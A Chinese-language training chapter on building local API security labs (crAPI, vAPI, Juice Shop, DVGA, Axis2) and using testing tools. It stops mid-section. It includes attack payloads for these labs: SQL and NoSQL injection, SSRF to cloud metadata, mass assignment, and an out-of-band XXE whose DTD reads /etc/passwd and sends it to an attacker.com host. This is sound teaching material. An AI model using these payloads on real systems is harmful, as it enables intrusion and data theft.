# 第28章 API安全测试环境

## 28.1 REST API漏洞环境

随着微服务架构的普及，API安全变得越来越重要。本节介绍常用的REST API漏洞测试环境搭建方法。

### 28.1.1 OWASP API Security Top 10介绍

#### 【通用】OWASP API Security Top 10 2023

| 编号 | 风险名称 | 描述 |
|------|----------|------|
| API1:2023 | 授权失效（Broken Authorization） | 攻击者可以访问或操作用户不应有权限访问的资源 |
| API2:2023 | 身份认证失效（Broken Authentication） | 身份认证机制存在缺陷，攻击者可冒充其他用户 |
| API3:2023 | 对象属性级别授权失效（Broken Object Property Level Authorization） | API返回超出所需的敏感数据 |
| API4:2023 | 无节制资源消耗（Unrestricted Resource Consumption） | 缺乏对资源消耗的限制，可能导致DoS |
| API5:2023 | 功能级别授权失效（Broken Function Level Authorization） | 普通用户可访问管理员功能 |
| API6:2023 | 服务端请求伪造（Server Side Request Forgery） | API从用户提供的URL获取资源而未验证 |
| API7:2023 | 安全配置错误（Security Misconfiguration） | 默认配置、错误配置、不当的CORS等 |
| API8:2023 | 库存管理不当（Improper Inventory Management） | 缺少API版本管理，暴露调试接口 |
| API9:2023 | 不当资产管理（Improper Assets Management） | 生产环境暴露测试或旧版本API |
| API10:2023 | 不安全的API消费（Unsafe Consumption of APIs） | 信任第三方API的数据和交互 |

### 28.1.2 crAPI（Completely Ridiculous API）Docker搭建

crAPI是一个完全荒谬的API，包含了OWASP API Security Top 10中的大多数漏洞。

#### 【Docker】安装部署

**方式一：使用Docker Compose（推荐）**

```bash
# 操作位置：Linux终端或Windows PowerShell
# 克隆仓库
git clone https://github.com/OWASP/crAPI.git
cd crAPI/deploy/docker

# 启动服务
docker-compose up -d

# 预期输出：
# Creating network "docker_default" with the default driver
# Pulling mongodb (mongo:4.2.0)...
# ...
# Creating crapi-mongodb     ... done
# Creating crapi-identity    ... done
# Creating crapi-community   ... done
# Creating crapi-workshop    ... done
# Creating crapi-web         ... done
# Creating mailhog           ... done
# Creating crapi-gateway     ... done
```

**方式二：快速启动（单条命令）**

```bash
# 操作位置：Linux终端或Windows PowerShell
curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml
docker-compose -f docker-compose.yml -p crapi up -d
```

#### 【Docker】访问地址

```
# Web界面地址
http://localhost:8888

# API网关地址
http://localhost:8888/identity/api/v2/user/login
http://localhost:8888/community/api/v2/community/posts/recent
http://localhost:8888/workshop/api/shop/products

# MailHog（邮件捕获）
http://localhost:8025
```

#### 【通用】默认账号

| 角色 | 邮箱 | 密码 |
|------|------|------|
| 普通用户 | test@example.com | testpass123 |
| 普通用户 | test2@example.com | testpass223 |
| 管理员 | admin@example.com | adminpass123 |

> 提示：也可以通过注册功能创建新账号，注册邮件会被MailHog捕获。

#### 【通用】漏洞验证步骤

**漏洞1：BOLA（Broken Object Level Authorization）**

```bash
# 操作位置：终端（使用curl测试）
# 步骤1：登录获取token
curl -s -X POST 'http://localhost:8888/identity/api/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@example.com","password":"testpass123"}'

# 预期输出：
# {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","message":"User logged in successfully"}

# 步骤2：查看自己的信息
curl -s 'http://localhost:8888/identity/api/v2/user/dashboard' \
  -H 'Authorization: Bearer <token>'

# 步骤3：尝试访问其他用户的信息（BOLA漏洞）
curl -s 'http://localhost:8888/identity/api/v2/user/2' \
  -H 'Authorization: Bearer <token>'

# 预期输出：
# {"id":2,"name":"test2","email":"test2@example.com",...}
# 成功访问到其他用户信息，说明存在BOLA漏洞
```

**漏洞2：批量枚举**

```bash
# 操作位置：终端
# 遍历用户ID枚举用户信息
for i in {1..10}; do
  curl -s "http://localhost:8888/identity/api/v2/user/$i" \
    -H 'Authorization: Bearer <token>' | jq '.email'
done

# 预期输出：
# "admin@example.com"
# "test@example.com"
# "test2@example.com"
# ...
```

**漏洞3：SSR（Server Side Request Forgery）**

```bash
# 操作位置：终端
# 利用视频上传功能的SSRF
curl -s -X POST 'http://localhost:8888/workshop/api/merchant/contact_mechanic' \
  -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' \
  -d '{
    "mechanic_api": "http://169.254.169.254/latest/meta-data/",
    "repeat_request_if_failed": false,
    "number_of_repeats": 1
  }'
```

### 28.1.3 vAPI Docker安装

vAPI是另一个故意设计存在漏洞的REST API平台。

#### 【Docker】安装部署

```bash
# 操作位置：Linux终端或Windows PowerShell
# 克隆仓库
git clone https://github.com/roottusk/vapi.git
cd vapi

# 使用Docker Compose启动
docker-compose up -d

# 预期输出：
# Creating network "vapi_default" with the default driver
# Creating vapi-mysql ... done
# Creating vapi-api   ... done
```

#### 【Docker】访问地址

```
# API基础地址
http://localhost/vapi

# API文档地址（Swagger UI）
http://localhost/vapi/api.php
```

#### 【通用】默认账号

| 角色 | 用户名 | 密码 |
|------|--------|------|
| 管理员 | admin | admin |
| 普通用户 | user1 | user1 |
| 普通用户 | user2 | user2 |

#### 【通用】漏洞验证步骤

**漏洞1：SQL注入**

```bash
# 操作位置：终端
# 测试SQL注入
curl -s "http://localhost/vapi/api.php?module=getUser&id=1' OR '1'='1"

# 预期输出：
# 返回所有用户数据，说明存在SQL注入漏洞
```

**漏洞2：JWT安全问题**

```bash
# 操作位置：终端
# 登录获取JWT
curl -s -X POST 'http://localhost/vapi/api.php?module=login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"user1","password":"user1"}'

# 修改JWT中的用户ID，尝试越权访问
# 使用jwt.io或脚本修改payload中的user_id为1（管理员）
```

### 28.1.4 OWASP Juice Shop API部分

OWASP Juice Shop也包含丰富的API漏洞。

#### 【Docker】安装部署

```bash
# 操作位置：Linux终端或Windows PowerShell
# 拉取镜像
docker pull bkimminich/juice-shop

# 启动容器
docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop

# 预期输出：
# Unable to find image 'bkimminich/juice-shop:latest' locally
# latest: Pulling from bkimminich/juice-shop
# ...
# Status: Downloaded newer image for bkimminich/juice-shop:latest
# <container_id>
```

#### 【Docker】访问地址

```
# Web界面
http://localhost:3000

# API基础地址
http://localhost:3000/rest

# API文档
http://localhost:3000/api-docs
```

#### 【通用】默认账号

| 角色 | 邮箱 | 密码 |
|------|------|------|
| 管理员 | admin@juice-sh.op | admin123 |
| 普通用户 | user@juice-sh.op | password |

#### 【通用】API漏洞验证

**漏洞1：NoSQL注入**

```bash
# 操作位置：终端
# NoSQL注入登录绕过
curl -s -X POST 'http://localhost:3000/rest/user/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}'

# 预期输出：
# 返回有效的认证token，说明存在NoSQL注入漏洞
```

**漏洞2：API批量赋值**

```bash
# 操作位置：终端
# 注册时添加isAdmin字段
curl -s -X POST 'http://localhost:3000/api/Users' \
  -H 'Content-Type: application/json' \
  -d '{
    "email":"hacker@test.com",
    "password":"hacker123",
    "isAdmin": true
  }'
```

### 28.1.5 Damn Vulnerable GraphQL Application

虽然名字是GraphQL，但也包含REST API部分。

#### 【Docker】安装部署

```bash
# 操作位置：Linux终端或Windows PowerShell
# 克隆仓库
git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git
cd Damn-Vulnerable-GraphQL-Application

# 使用Docker Compose
docker-compose up -d

# 预期输出：
# Creating network "dvgapp_default" with the default driver
# Pulling web (dolevf/dvga:latest)...
# ...
# Creating dvgapp_web_1 ... done
```

#### 【Docker】访问地址

```
# Web界面
http://localhost:5013

# GraphQL端点
http://localhost:5013/graphql

# GraphiQL界面
http://localhost:5013/graphiql
```

### 28.1.6 常见问题

**Q: crAPI启动后无法访问怎么办？**

A: 排查步骤：
```bash
# 查看容器状态
docker-compose ps

# 查看日志
docker-compose logs crapi-gateway

# 检查端口占用
netstat -tlnp | grep 8888
```

**Q: Juice Shop登录不了怎么办？**

A: 常见原因：
1. 账号密码错误 - 使用默认账号或注册新账号
2. 容器未完全启动 - 等待30秒后再试
3. 浏览器缓存 - 尝试无痕模式

---

## 28.2 GraphQL漏洞环境

GraphQL是一种API查询语言，由于其灵活性，也带来了新的安全挑战。

### 28.2.1 GraphQL Damn Vulnerable Application

#### 【Docker】DVGA安装

```bash
# 操作位置：Linux终端或Windows PowerShell
# 直接拉取运行
docker run -d -p 5013:5013 --name dvga dolevf/dvga:latest

# 预期输出：
# Unable to find image 'dolevf/dvga:latest' locally
# latest: Pulling from dolevf/dvga
# ...
# Status: Downloaded newer image for dolevf/dvga:latest
# <container_id>
```

#### 【Docker】访问地址

```
# 主界面
http://localhost:5013

# GraphQL端点
http://localhost:5013/graphql

# GraphiQL IDE
http://localhost:5013/graphiql
```

#### 【通用】默认账号

| 角色 | 用户名 | 密码 |
|------|--------|------|
| 管理员 | admin | admin123 |
| 普通用户 | user | user123 |

#### 【通用】漏洞验证步骤

**漏洞1：内省查询（Introspection）**

```graphql
# 操作位置：GraphiQL界面 (http://localhost:5013/graphiql)
# 完整内省查询
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  kind
  name
  fields(includeDeprecated: true) {
    name
    args {
      ...InputValue
    }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

**漏洞2：GraphQL注入**

```graphql
# 操作位置：GraphiQL界面
# 查询用户（可能存在注入）
{
  user(id: "1' OR '1'='1") {
    id
    name
    email
  }
}
```

**漏洞3：批量查询攻击**

```graphql
# 操作位置：GraphiQL界面
# 批量查询（可能导致DoS）
query {
  user1: user(id: 1) { id name }
  user2: user(id: 2) { id name }
  user3: user(id: 3) { id name }
  # ... 可以重复成百上千次
}
```

**漏洞4：字段建议功能**

```graphql
# 操作位置：GraphiQL界面
# 故意输入错误字段，利用错误提示枚举字段
{
  user {
    passwor
  }
}

# 预期输出（错误提示中包含正确字段名）：
# Cannot query field "passwor" on type "User". Did you mean "password"?
```

### 28.2.2 DVGA（Damn Vulnerable GraphQL App）Docker

DVGA包含多种GraphQL漏洞，涵盖OWASP Top 10。

#### 【Docker】Docker Compose方式

```bash
# 操作位置：Linux终端或Windows PowerShell
# 创建docker-compose.yml
cat > docker-compose.yml << EOF
version: '3'
services:
  dvga:
    image: dolevf/dvga:latest
    ports:
      - "5013:5013"
    environment:
      - WEB_HOST=0.0.0.0
      - WEB_PORT=5013
    restart: unless-stopped
EOF

# 启动
docker-compose up -d

# 验证
curl http://localhost:5013/graphql?query={__typename}

# 预期输出：
# {"data":{"__typename":"Query"}}
```

#### 【通用】漏洞类型列表

DVGA包含以下漏洞类型：

1. **GraphQL内省（Introspection）** - 启用了完整的内省查询
2. **GraphQL注入** - 查询参数未正确过滤
3. **身份认证绕过** - 未正确实现认证
4. **授权失效** - 可越权访问数据
5. **批处理攻击** - 无限制批量查询
6. **字段建议** - 错误消息泄露字段名
7. **DoS攻击** - 嵌套查询、递归查询
8. **敏感数据泄露** - 错误信息泄露
9. **CSRF** - 缺少CSRF保护
10. **SSRF** - 通过GraphQL进行服务端请求伪造

### 28.2.3 GraphQL Voyager

GraphQL Voyager是GraphQL Schema的可视化工具。

#### 【Docker】安装部署

```bash
# 操作位置：Linux终端或Windows PowerShell
# 方式一：Docker运行
docker run -d -p 3001:80 --name graphql-voyager graphql/voyager

# 方式二：使用GraphiQL插件
# 大多数GraphQL IDE已集成Voyager功能

# 预期输出：
# Unable to find image 'graphql/voyager:latest' locally
# ...
# Status: Downloaded newer image for graphql/voyager:latest
# <container_id>
```

#### 【Docker】使用方法

```
# 访问地址
http://localhost:3001

# 使用步骤：
# 1. 打开Voyager
# 2. 输入GraphQL端点URL（如http://localhost:5013/graphql）
# 3. 点击"Display"按钮
# 4. 查看可视化的Schema关系图
```

### 28.2.4 InQL Scanner安装使用

InQL是一个Burp Suite扩展，用于GraphQL安全测试。

#### 【通用】安装方法

**方法一：Burp Suite BApp Store安装**

```
操作位置：Burp Suite
1. 打开Burp Suite
2. 进入 Extender > BApp Store
3. 搜索 "InQL"
4. 点击 "Install"
5. 等待安装完成
```

**方法二：手动安装**

```bash
# 操作位置：终端
# 克隆仓库
git clone https://github.com/doyensec/inql.git
cd inql

# 编译
./gradlew build

# 在Burp中加载：
# Extender > Extensions > Add > Select file > inql-all.jar
```

#### 【通用】使用方法

```
操作位置：Burp Suite
1. 安装InQL后，会出现"InQL"标签页
2. 在Target中找到GraphQL请求
3. 右键请求 > Send to InQL Scanner
4. InQL会自动分析Schema
5. 可以生成所有可能的查询
6. 可以发送到Repeater进行测试
```

### 28.2.5 GraphQLmap

GraphQLmap是一个用于GraphQL渗透测试的交互式脚本。

#### 【Linux环境】安装

```bash
# 操作位置：Kali Linux终端
# 克隆仓库
git clone https://github.com/swisskyrepo/GraphQLmap.git
cd GraphQLmap

# 安装依赖
pip3 install -r requirements.txt

# 验证安装
python3 graphqlmap.py -h

# 预期输出：
# usage: graphqlmap.py [-h] -u URL [-m METHOD] [-H HEADERS] [-f REQUEST_FILE]
# 
# GraphQLmap - GraphQL Pentest Framework
```

#### 【Linux环境】使用方法

```bash
# 操作位置：Kali Linux终端
# 启动交互模式
python3 graphqlmap.py -u http://localhost:5013/graphql

# 预期输出：
#  🐢 GraphQLmap - Swaggie
#
# graphql >
```

```
# 操作位置：GraphQLmap交互界面
# 连接到GraphQL端点
graphql > connect http://localhost:5013/graphql

# 执行内省查询
graphql > dumpformat

# 查看所有查询
graphql > show queries

# 查看所有变更
graphql > show mutations

# 生成查询
graphql > generate

# 测试数据库信息
graphql > dbinfo
```

### 28.2.6 Graphql-voyager

#### 【通用】在线使用

```
操作位置：浏览器
# 在线版本
https://ivangoncharov.github.io/graphql-voyager/

# 使用步骤：
# 1. 打开网站
# 2. 选择"Via Introspection"
# 3. 输入GraphQL端点URL
# 4. 点击"Display"
```

### 28.2.7 常见问题

**Q: GraphQL内省查询被禁用怎么办？**

A: 可以尝试以下方法：
1. 使用字段建议功能（错误提示）
2. 暴力猜解字段名
3. 使用GraphQLmap的字典爆破
4. 查看前端JavaScript代码中的GraphQL查询

**Q: DVGA容器启动失败怎么办？**

A: 排查方法：
```bash
# 查看容器日志
docker logs dvga

# 检查端口占用
lsof -i :5013

# 重新拉取镜像
docker pull dolevf/dvga:latest
docker run -d -p 5013:5013 dolevf/dvga:latest
```

---

## 28.3 SOAP API漏洞环境

SOAP（Simple Object Access Protocol）是一种基于XML的协议，在企业级应用中仍然广泛使用。

### 28.3.1 环境搭建

#### 【Docker】使用vulhub的SOAP环境

```bash
# 操作位置：Linux终端或Windows PowerShell
# 克隆vulhub
git clone https://github.com/vulhub/vulhub.git
cd vulhub

# 查找SOAP相关环境
find . -name "*soap*" -o -name "*axis*" -o -name "*cxf*"
```

#### 【Docker】Axis2环境搭建

```bash
# 操作位置：Linux终端或Windows PowerShell
# 进入axis2目录
cd vulhub/axis2/CVE-2019-0227

# 启动环境
docker-compose up -d

# 预期输出：
# Creating network "cve-2019-0227_default" with the default driver
# Pulling web (vulhub/axis2:1.4)...
# ...
# Creating cve-2019-0227_web_1 ... done
```

#### 【Docker】访问地址

```
# Axis2管理控制台
http://localhost:8080/axis2/axis2-admin/

# 默认账号
# 用户名：admin
# 密码：axis2

# Web服务列表
http://localhost:8080/axis2/services/listServices
```

### 28.3.2 SOAP UI安装配置

SOAP UI是最流行的SOAP API测试工具。

#### 【Windows环境】Windows安装

```
操作位置：Windows浏览器
# 步骤1：下载安装包
# 访问 https://www.soapui.org/downloads/soapui/
# 下载 SoapUI Open Source 版本

# 步骤2：安装
# 1. 双击安装包
# 2. 点击Next
# 3. 接受许可协议
# 4. 选择安装路径（默认 C:\Program Files\SmartBear\SoapUI-x.x.x）
# 5. 选择组件（默认全选）
# 6. 点击Install
# 7. 等待安装完成
# 8. 点击Finish
```

#### 【Linux环境】Linux安装

```bash
# 操作位置：Linux终端
# 下载
wget https://s3.amazonaws.com/downloads.eviware/soapuios/5.7.0/SoapUI-5.7.0-linux-bin.tar.gz

# 解压
tar -xzf SoapUI-5.7.0-linux-bin.tar.gz
cd SoapUI-5.7.0/bin

# 启动
./soapui.sh
```

#### 【通用】基本使用

```
操作位置：SOAP UI界面
# 创建SOAP项目：
# 1. File > New SOAP Project
# 2. 输入项目名称
# 3. 输入WSDL地址（如 http://localhost:8080/axis2/services/Version?wsdl）
# 4. 勾选 "Create Requests"
# 5. 点击OK
# 6. 展开项目，双击请求
# 7. 修改请求内容
# 8. 点击绿色三角形运行
```

### 28.3.3 WSDL分析工具

#### 【Linux环境】WSDL扫描工具

```bash
# 操作位置：Kali Linux终端
# 安装wsdl-scanner
sudo apt install -y python3-pip
pip3 install wsdl-scanner

# 分析WSDL
wsdl-scanner -u http://localhost:8080/axis2/services/Version?wsdl
```

#### 【通用】在线WSDL分析

```
操作位置：浏览器
# 在线WSDL查看器
https://www.wsdl-analyzer.com/

# 使用方法：
# 1. 输入WSDL URL或上传WSDL文件
# 2. 点击Analyze
# 3. 查看服务、端口、操作、消息等详细信息
```

#### 【Linux环境】使用curl测试SOAP API

```bash
# 操作位置：终端
# 发送SOAP请求
curl -X POST http://localhost:8080/axis2/services/Version \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "urn:getVersion"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns1:getVersion xmlns:ns1="http://axisversion.sample">
    </ns1:getVersion>
  </soap:Body>
</soap:Envelope>'

# 预期输出：
# <?xml version='1.0' encoding='UTF-8'?>
# <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
#   <soapenv:Body>
#     <ns:getVersionResponse xmlns:ns="http://axisversion.sample">
#       <ns:return>Hi there, the Axis version is: 1.4</ns:return>
#     </ns:getVersionResponse>
#   </soapenv:Body>
# </soapenv:Envelope>
```

### 28.3.4 XXE in SOAP环境

SOAP由于基于XML，容易受到XXE（XML External Entity）攻击。

#### 【通用】XXE测试方法

```xml
<!-- 操作位置：SOAP UI或Burp Repeater -->
<!-- 测试XXE：读取本地文件 -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns1:someFunction xmlns:ns1="http://example.com">
      <arg0>&xxe;</arg0>
    </ns1:someFunction>
  </soap:Body>
</soap:Envelope>
```

```xml
<!-- 测试XXE：SSRF -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns1:someFunction xmlns:ns1="http://example.com">
      <arg0>&xxe;</arg0>
    </ns1:someFunction>
  </soap:Body>
</soap:Envelope>
```

#### 【通用】Blind XXE测试

```xml
<!-- 带外XXE（OOB）测试 -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns1:someFunction xmlns:ns1="http://example.com">
      <arg0>&send;</arg0>
    </ns1:someFunction>
  </soap:Body>
</soap:Envelope>
```

evil.dtd内容（放在攻击者服务器上）：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

### 28.3.5 常见问题

**Q: WSDL文件访问不到怎么办？**

A: 排查方法：
1. 确认服务正在运行
2. 尝试在URL后添加 ?wsdl 或 ?WSDL
3. 检查路径是否正确
4. 使用目录扫描工具查找WSDL文件

**Q: SOAP UI连接超时怎么办？**

A: 检查：
1. 网络连通性（ping测试）
2. 端口是否开放
3. 防火墙设置
4. 代理设置（File > Preferences > Proxy Settings）

---

## 28.4 API安全测试工具

本节介绍常用的API安全测试工具的安装和使用方法。

### 28.4.1 Postman API测试

Postman是最流行的API测试工具之一。

#### 【Windows环境】Windows安装

```
操作位置：Windows浏览器
# 步骤1：下载
# 访问 https://www.postman.com/downloads/
# 下载 Windows 64-bit 版本

# 步骤2：安装
# 1. 双击安装包 Postman-win64-x.x.x-Setup.exe
# 2. 等待自动安装完成
# 3. 安装完成后自动启动
# 4. 可以选择注册账号或跳过登录使用（Skip and go to the app）
```

#### 【Linux环境】Linux安装

```bash
# 操作位置：Linux终端
# 方式一：下载安装包
wget https://dl.pstmn.io/download/latest/linux64 -O postman.tar.gz
sudo tar -xzf postman.tar.gz -C /opt
sudo ln -s /opt/Postman/Postman /usr/bin/postman

# 方式二：Snap安装（Ubuntu）
sudo snap install postman

# 启动
postman &
```

#### 【通用】基本使用

```
操作位置：Postman界面
# 创建请求：
# 1. 点击 "+" 新建请求
# 2. 选择请求方法（GET/POST/PUT/DELETE等）
# 3. 输入URL（如 http://localhost:8888/identity/api/auth/login）
# 4. 设置Headers（如 Content-Type: application/json）
# 5. 设置Body（选择raw > JSON）
# 6. 输入请求体
# 7. 点击Send
# 8. 查看响应
```

**示例：登录请求**

```
操作位置：Postman
# Method: POST
# URL: http://localhost:8888/identity/api/auth/login
# Headers:
#   Content-Type: application/json
# Body (raw JSON):
# {
#   "email": "test@example.com",
#   "password": "testpass123"
# }
# 
# 预期响应：
# {
#   "token": "eyJhbGciOiJIUzI1NiIs...",
#   "message": "User logged in successfully"
# }
```

### 28.4.2 Burp Suite API测试

Burp Suite是Web安全测试的瑞士军刀，也非常适合API测试。

#### 【通用】配置Burp拦截API请求

```
操作位置：Burp Suite
# 步骤1：配置代理
# 1. Proxy > Proxy settings
# 2. 确认代理监听 127.0.0.1:8080
# 
# 步骤2：配置浏览器或Postman代理
# - 浏览器：设置代理为 127.0.0.1:8080
# - Postman：Settings > Proxy > Add custom proxy
# 
# 步骤3：拦截请求
# 1. Proxy > Intercept > Intercept is on
# 2. 发送API请求
# 3. 在Burp中查看和修改请求
# 4. Forward发送
```

#### 【通用】API测试常用功能

```
操作位置：Burp Suite
# 1. Repeater - 重放和修改请求
#    右键请求 > Send to Repeater
#    修改参数后发送
# 
# 2. Intruder - 自动化模糊测试
#    右键请求 > Send to Intruder
#    设置payload位置
#    配置payload类型
#    开始攻击
# 
# 3. Scanner - 主动/被动扫描
#    右键请求 > Do active scan
#    或使用Live passive scan
# 
# 4. Sequencer - 测试令牌随机性
#    右键请求 > Send to Sequencer
#    选择需要分析的令牌
#    开始采集
```

### 28.4.3 OWASP ZAP API扫描

OWASP ZAP是开源的Web应用安全扫描器。

#### 【Windows环境】Windows安装

```
操作位置：Windows浏览器
# 步骤1：下载
# 访问 https://www.zaproxy.org/download/
# 下载 Windows Installer

# 步骤2：安装
# 1. 双击安装包
# 2. 选择语言
# 3. 点击Next
# 4. 接受协议
# 5. 选择安装路径
# 6. 点击Install
# 7. 完成安装
```

#### 【Linux环境】Linux安装

```bash
# 操作位置：Linux终端
# 下载
wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2.14.0_Linux.tar.gz

# 解压
tar -xzf ZAP_2.14.0_Linux.tar.gz
cd ZAP_2.14.0

# 启动
./zap.sh &
```

#### 【通用】API扫描方法

```
操作位置：OWASP ZAP
# 快速扫描API：
# 1. 打开ZAP
# 2. 选择 "Automated Scan"
# 3. 输入API基础URL
# 4. 选择扫描策略
# 5. 点击 "Attack"
# 6. 等待扫描完成
# 7. 查看Alerts标签页中的漏洞
```

#### 【Linux环境】命令行API扫描

```bash
# 操作位置：终端
# 使用ZAP命令行扫描
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://localhost:8888

# 安装zap-cli
pip install --upgrade zapcli

# 主动扫描API
zap-cli open-url http://localhost:8888
zap-cli spider http://localhost:8888
zap-cli active-scan http://localhost:8888

# 生成报告
zap-cli report -o zap_report.html -f html
```

### 28.4.4 Postman安装配置

#### 【通用】环境变量配置

```
操作位置：Postman
# 创建环境变量：
# 1. 点击左下角 "Environment quick look"（眼睛图标）
# 2. 点击 "Add"
# 3. 环境名称：Test Environment
# 4. 添加变量：
#    - base_url: http://localhost:8888
#    - token: (留空，登录后自动设置)
# 5. 点击 "Add"
# 6. 在右上角选择刚创建的环境
```

#### 【通用】集合创建

```
操作位置：Postman
# 创建API测试集合：
# 1. 点击 "Collections" > "+"
# 2. 命名为 "crAPI Tests"
# 3. 添加请求到集合：
#    - 配置好请求后点击 "Save"
#    - 选择集合
#    - 命名请求
#    - 点击保存
```

### 28.4.5 API测试集合创建

#### 【通用】Postman测试脚本示例

```javascript
// 操作位置：Postman Tests标签页
// 示例1：检查响应状态码
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

// 示例2：检查响应时间
pm.test("Response time is less than 200ms", function () {
    pm.expect(pm.response.responseTime).to.be.below(200);
});

// 示例3：解析响应并设置环境变量
pm.test("Login successful", function () {
    var jsonData = pm.response.json();
    pm.expect(jsonData.message).to.eql("User logged in successfully");
    // 设置token到环境变量
    pm.environment.set("token", jsonData.token);
});

// 示例4：验证响应结构
pm.test("Response has required fields", function () {
    var jsonData = pm.response.json();
    pm.expect(jsonData).to.have.property('id');
    pm.expect(jsonData).to.have.property('name');
    pm.expect(jsonData).to.have.property('email');
});
```

### 28.4.6 自动化测试

#### 【Linux环境】Newman命令行运行

Newman是Postman的命令行运行工具。

```bash
# 操作位置：终端
# 安装Newman（需要Node.js）
npm install -g newman

# 导出Postman集合和环境
# Postman > Collection > Export > 保存为 crapi_collection.json
# Postman > Environment > Export > 保存为 test_env.json

# 运行集合
newman run crapi_collection.json -e test_env.json

# 预期输出：
# newman
# 
# crAPI Tests
# 
# → Login
#   POST http://localhost:8888/identity/api/auth/login [200 OK, 500B, 150ms]
#   ✓ Status code is 200
#   ✓ Login successful
# 
# → Get User Info
#   GET http://localhost:8888/identity/api/v2/user/dashboard [200 OK, 300B, 80ms]
#   ✓ Status code is 200
# 
# ┌─────────────────────────┬──────────┬──────────┐
# │                         │ executed │   failed │
# ├─────────────────────────┼──────────┼──────────┤
# │              iterations │        1 │        0 │
# ├─────────────────────────┼──────────┼──────────┤
# │                requests │        2 │        0 │
# ├─────────────────────────┼──────────┼──────────┤
# │            test-scripts │        2 │        0 │
# ├─────────────────────────┼──────────┼──────────┤
# │      prerequest-scripts │        0 │        0 │
# ├─────────────────────────┼──────────┼──────────┤
# │              assertions │        3 │        0 │
# └─────────────────────────┴──────────┴──────────┘
```

#### 【Linux环境】生成测试报告

```bash
# 操作位置：终端
# 安装HTML报告插件
npm install -g newman-reporter-html

# 生成HTML报告
newman run crapi_collection.json -e test_env.json -r html,json,cli

# 生成JUnit格式报告（CI/CD集成）
newman run crapi_collection.json -e test_env.json -r junit
```

### 28.4.7 常见问题

**Q: Postman无法发送请求怎么办？**

A: 检查：
1. URL是否正确
2. 网络连接是否正常
3. 代理设置是否正确
4. SSL证书设置（Settings > General > SSL certificate verification）

**Q: Burp Suite抓不到API请求怎么办？**

A: 排查：
1. 确认代理设置正确
2. 确认Intercept已开启
3. 检查HTTP历史（Proxy > HTTP history）
4. 对于HTTPS，需要安装Burp证书

---

## 28.5 API自动化扫描工具

自动化扫描工具可以快速发现API中的常见漏洞。

### 28.5.1 Nuclei API模板

Nuclei是一个基于模板的漏洞扫描器。

#### 【Linux环境】安装

```bash
# 操作位置：Kali Linux终端
# Kali已预装，如未安装：
sudo apt install -y nuclei

# 或下载最新版本
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 更新模板
nuclei -ut

# 预期输出：
# 
# 		_____  __    _______  _______  _____  _
# 		|  |  |  |  |       ||       ||     || |
# 		|  |  |  |  |   ____||    _  ||  ___|| |
# 		|  |  |  |  |  |____ |  |_|  || |___ | |
# 		|  |  |  |  |____   ||  _____||  ___||_|
# 		|  |  |  |   ____|  | |      | |
# 		|__|  |__|  |_______||_|      |_|      |_|
# 
# 						v3.0.0
# 
# [INF] nuclei-templates are updated, current version: 9.5.0
```

#### 【Linux环境】API扫描

```bash
# 操作位置：终端
# 扫描单个URL
nuclei -u http://localhost:8888 -tags api

# 扫描多个URL
cat urls.txt | nuclei -tags api

# 运行所有API相关模板
nuclei -u http://localhost:8888 -tags api,rest,graphql

# 预期输出：
# [INF] Templates loaded for scan: 125
# [INF] [api-version-disclosure] found at http://localhost:8888/api/v1/
# [INF] [cors-misconfig] found at http://localhost:8888/api/users
# [INF] [swagger-ui-exposure] found at http://localhost:8888/swagger-ui.html
```

#### 【Linux环境】常用API模板

```bash
# 操作位置：终端
# 搜索API相关模板
nuclei -tl | grep -i api

# 常用模板分类：
# - exposures/apis/ - API信息泄露
# - misconfiguration/ - 配置错误
# - vulnerabilities/ - 已知漏洞
# - technologies/ - 技术识别

# 运行特定模板
nuclei -u http://localhost:8888 -t ~/nuclei-templates/exposures/apis/

# 扫描Swagger/OpenAPI
nuclei -u http://localhost:8888 -t ~/nuclei-templates/exposures/apis/swagger.yaml
```

### 28.5.2 Kiterunner API扫描

Kiterunner是专门用于API发现和测试的工具。

#### 【Linux环境】安装

```bash
# 操作位置：Kali Linux终端
# 安装依赖
sudo apt install -y golang-go

# 克隆并编译
